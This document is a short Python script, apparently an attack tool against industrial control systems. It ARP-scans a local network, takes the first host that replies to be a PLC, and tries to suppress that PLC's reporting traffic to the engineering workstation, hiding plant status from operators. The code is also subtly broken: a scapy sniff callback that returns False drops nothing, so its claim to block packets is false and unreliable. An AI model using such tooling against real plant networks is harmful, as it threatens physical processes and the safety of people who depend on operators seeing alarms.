import subprocess
import socket
from scapy.all import *

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Perform a network scan to discover the PLC's IP address
    # This is a basic example; adjust it based on your network setup
    ip_range = "192.168.1.0/24"  # Adjust this to match your network
    print(f"Scanning network {ip_range} for the PLC...")
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    # Filter and return the PLC's IP address (assuming it's the first device found)
    for element in answered_list:
        return element[1].psrc

    return None

# Function to block reporting messages
def block_reporting_messages(plc_ip):
    print(f"Blocking reporting messages from PLC at {plc_ip}...")

    # Define a filter to drop packets from the PLC to the engineering workstation
    def packet_filter(packet):
        if IP in packet and packet[IP].src == plc_ip:
            print(f"Blocking packet from {packet[IP].src} to {packet[IP].dst}")
            return False  # Drop the packet
        return True  # Allow other packets

    # Start sniffing and blocking packets
    sniff(filter=f"ip src {plc_ip}", prn=packet_filter, store=0)

# Main script
if __name__ == "__main__":
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("PLC not found on the network.")
        exit(1)
    print(f"PLC found at IP address: {plc_ip}")

    # Block reporting messages
    try:
        block_reporting_messages(plc_ip)
    except KeyboardInterrupt:
        print("Script stopped by user.")